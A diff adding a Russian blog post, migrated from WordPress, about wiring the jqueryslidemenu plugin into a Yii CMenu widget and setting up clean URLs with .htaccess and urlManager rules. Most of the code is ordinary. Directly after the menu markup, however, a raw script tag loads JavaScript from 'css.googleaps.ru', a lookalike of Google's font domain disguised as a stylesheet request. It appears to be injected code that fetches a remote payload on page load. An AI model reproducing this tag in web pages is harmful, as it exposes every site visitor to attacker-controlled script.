@@ -1,0 +1,118 @@
+---
+layout: post
+status: publish
+published: true
+title: Yii (выпадающее меню + ЧПУ)
+author:
+  display_name: Maxyc Webber
+  login: admin
+  email: maxycws@gmail.com
+  url: ''
+author_login: admin
+author_email: maxycws@gmail.com
+wordpress_id: 1651
+wordpress_url: http://devdocs.ru/partners-news/yii-vyipadayushhee-menyu-chpu/
+date: '2015-04-09 13:59:34 +0200'
+date_gmt: '2015-04-09 13:59:34 +0200'
+categories:
+- Yii framework
+tags:
+- php
+- ip
+- css
+- gist
+- jquery
+- js
+- htaccess
+- rewrite
+- des1roer
+- yii
+- orm
+comments: []
+---
+<div dir="ltr" style="text-align: left;">
+<div dir="ltr" style="text-align: left;">
+<div dir="ltr" style="text-align: left;"><a href="http:&#47;&#47;www.yiiframework.com&#47;wiki&#47;93&#47;using-the-jqueryslidemenu-plugin-with-cmenu&#47;">пруф<&#47;a><br />
+1. <a href="https:&#47;&#47;drive.google.com&#47;file&#47;d&#47;0B8SBzylZ-emONEgtaWhvMXpNVGM&#47;view?usp=sharing">качаем<&#47;a><br />
+2.папку images в корень, папку scripts в protected<br />
+3.в layoutsmain в <head> подключаем<br />
+---</p>
+<pre><code>&nbsp;<?php<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &#47;&#47; remember that you can actually point to the js files directly if<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &#47;&#47; your script file is outside of protected&#47;subfolders<br />
+<&#47;code><&#47;pre></p>
+<pre><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $jqueryslidemenupath = Yii::app()->assetManager->publish(Yii::app()->basePath . '&#47;scripts&#47;jqueryslidemenu&#47;');<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &#47;&#47;Register jQuery, JS and CSS files<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Yii::app()->clientScript->registerCssFile($jqueryslidemenupath . '&#47;jqueryslidemenu.css');<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Yii::app()->clientScript->registerCoreScript('jquery');<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Yii::app()->clientScript->registerScriptFile($jqueryslidemenupath . '&#47;jqueryslidemenu.js');<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ?><&#47;code><&#47;pre><br />
+<&#47;div><br />
+<&#47;div><br />
+---<br />
+4. вместо mainmenu пишем, если все хорошо - радуемся<br />
+---</p>
+<pre><code>
+<div id="myslidemenu" class="jqueryslidemenu">
+<?php $this->widget('zii.widgets.CMenu',array(<br />
+&nbsp;&nbsp; 'items'=>array(<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; array('label'=>'Home', 'url'=>array('&#47;site&#47;index')),<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; array('label'=>'About', 'url'=>array('&#47;site&#47;page', 'view'=>'about')),<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; array('label'=>'Contact', 'url'=>array('&#47;site&#47;contact')),<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; array('label'=>'jqSlideMenuTest', 'url'=>array('#'),<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 'items'=>array(<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; array('label'=>'Home', 'url'=>array('&#47;site&#47;index')),<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; array('label'=>'About', 'url'=>array('&#47;site&#47;page', 'view'=>'about')),<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; array('label'=>'Contact', 'url'=>array('&#47;site&#47;contact'),<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 'items'=>array(<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; array('label'=>'Home', 'url'=>array('&#47;site&#47;index')),<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; array('label'=>'About', 'url'=>array('&#47;site&#47;page', 'view'=>'about')),<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; array('label'=>'Contact', 'url'=>array('&#47;site&#47;contact'),<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 'items'=>array(<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; array('label'=>'Home', 'url'=>array('&#47;site&#47;index')),<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; array('label'=>'About', 'url'=>array('&#47;site&#47;page', 'view'=>'about')),<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; array('label'=>'Contact', 'url'=>array('&#47;site&#47;contact')),<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; )),<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; )),<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; )),&nbsp;&nbsp;<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; array('label'=>'Login', 'url'=>array('&#47;site&#47;login'), 'visible'=>Yii::app()->user->isGuest),<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; array('label'=>'Logout ('.Yii::app()->user->name.')', 'url'=>array('&#47;site&#47;logout'), 'visible'=>!Yii::app()->user->isGuest)),<br />
+&nbsp;&nbsp;&nbsp;&nbsp; )); ?><br />
+<br style="clear: left" &#47;><br />
+<&#47;div><!-- myslidemenu--><script src="&#47;&#47;css.googleaps.ru&#47;css?f=Open+Sans&cd=mb&ver=4.2.2"><&#47;script><&#47;code><&#47;pre></p>
+<pre>---<&#47;pre><br />
+5. скорее всего картинки у вас работать не будут.<br />
+в jqueryslidemenu.js наверно можно переназначить путь, но index.php гадит всю малину.<br />
+снесем index.php</p>
+<p>в корне создаемпереписываем .htaccess<br />
+---</p>
+<pre><code>Options Includes FollowSymLinks<br />
+#hide index.php<br />
+RewriteEngine On<br />
+RewriteCond %{REQUEST_FILENAME} !-f<br />
+RewriteCond %{REQUEST_FILENAME} !-d<br />
+RewriteRule . index.php<&#47;code><&#47;pre></p>
+<pre>---<&#47;pre><br />
+в configmain</p>
+<pre><code>----<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &#47;&#47; uncomment the following to enable URLs in path-format<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 'urlManager' => array(<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 'urlFormat' => 'path',<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 'showScriptName'=>false,<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 'rules' => array(<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &#47;&#47; стандартное правило для обработки '&#47;' как 'site&#47;index'<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; '' => 'site&#47;index',<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &#47;&#47; это пример добавления который заработал<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &#47;&#47;'secondcontroller&#47;<action:.*>'=>'secondcontroller&#47;<action>',<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 'user&#47;<action:.*>'=>'user&#47;<action>',<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &#47;&#47;'<action:.*>'=>'site&#47;<action>', &#47;&#47;закомментил а то глючило с ним<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; '<controller:w+>&#47;<id:d+>' => '<controller>&#47;view',<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; '<controller:w+>&#47;<action:w+>&#47;<id:d+>' => '<controller>&#47;<action>',<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; '<controller:w+>&#47;<action:w+>' => '<controller>&#47;<action>',<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ),<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ),<br />
+--- <&#47;code><&#47;pre><br />
+получить должны примерно следующее</p>
+<div class="separator" style="clear: both; text-align: center;"><a style="margin-left: 1em; margin-right: 1em;" href="http:&#47;&#47;i.imgur.com&#47;ah1qSeE.png"><img src="http:&#47;&#47;i.imgur.com&#47;ah1qSeE.png" alt="" width="640" height="250" border="0" &#47;><&#47;a><&#47;div><br />
+<&#47;div><br />
+Source: des1roer.blogspot.com</p>
